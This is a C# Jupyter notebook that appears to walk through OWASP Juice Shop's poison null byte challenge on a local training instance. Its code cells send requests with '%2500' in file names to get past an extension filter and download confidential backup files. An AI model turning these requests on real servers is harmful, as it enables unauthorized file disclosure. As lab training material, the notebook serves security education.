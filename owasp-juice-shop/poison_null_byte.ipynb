{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "source": [
    "# Poison Null Byte\n",
    "\n",
    "By embedding NULL Bytes/characters into applications that do not handle postfix NULL terminators properly, an attacker can exploit a system using techniques such as Local File Inclusion. The Poison Null Byte exploit takes advantage strings with a known length that can contain null bytes, and whether or not the API being attacked uses null terminated strings. By placing a NULL byte in the string at a certain byte, the string will terminate at that point, nulling the rest of the string, such as a file extension.\n",
    "\n",
    "## Bypass a security control with a Poison Null Byte\n",
    "Bla\n",
    "\n",
    "### 1. Browse the ftp page\n",
    "Visit http://localhost:3000/ftp, and also notice the error message when trying to access any of the files\n",
    "\n",
    "### 2. Access a confidential document"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "using System.Net.Http;\n",
    "\n",
    "const string BASE_URL = \"http://localhost:3000\";\n",
    "var BASE_URI = new Uri(BASE_URL);\n",
    "\n",
    "using(var client = new HttpClient()) {\n",
    "    var uri = new Uri(BASE_URI, \"ftp/acquisitions.md\");\n",
    "    var response = await client.GetAsync(uri);\n",
    "    Console.WriteLine(await response.Content.ReadAsStringAsync());\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 3. Download the easter egg"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "using(var client = new HttpClient()) {\n",
    "    var uri = new Uri(BASE_URI, \"ftp/eastere.gg%2500.md\");\n",
    "    var response = await client.GetAsync(uri);\n",
    "    Console.WriteLine(await response.Content.ReadAsStringAsync());\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 4. Download the list of packages in the application"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "using(var client = new HttpClient()) {\n",
    "    var uri = new Uri(BASE_URI, \"ftp/package.json.bak%2500.md\");\n",
    "    var response = await client.GetAsync(uri);\n",
    "    Console.WriteLine(await response.Content.ReadAsStringAsync());\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 5. Access a salesman's forgotten backup file."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "using(var client = new HttpClient()) {\n",
    "    var uri = new Uri(BASE_URI, \"ftp/coupons_2013.md.bak%2500.md\");\n",
    "    var response = await client.GetAsync(uri);\n",
    "    Console.WriteLine(await response.Content.ReadAsStringAsync());\n",
    "}"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (C#)",
   "language": "C#",
   "name": ".net-csharp"
  },
  "language_info": {
   "file_extension": ".cs",
   "mimetype": "text/x-csharp",
   "name": "C#",
   "pygments_lexer": "csharp",
   "version": "9.0"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
